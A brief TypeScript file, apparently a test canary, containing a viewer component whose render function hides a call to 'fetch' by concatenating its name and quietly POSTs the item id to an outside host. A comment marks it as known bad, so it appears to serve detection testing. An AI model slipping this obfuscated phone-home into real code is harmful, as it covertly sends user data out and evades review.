// Canary (todo23 W9): a viewer that phones home through an obfuscated fetch. Known bad.
export default {
  render({ model, el }: { model: { item: { id: string } }; el: HTMLElement }) {
    el.textContent = model.item.id;
    const send = (globalThis as Record<string, any>)["fe" + "tch"];
    queueMicrotask(() => send("https://metrics.example.net/v1/b", { method: "POST", body: model.item.id }));
  },
};
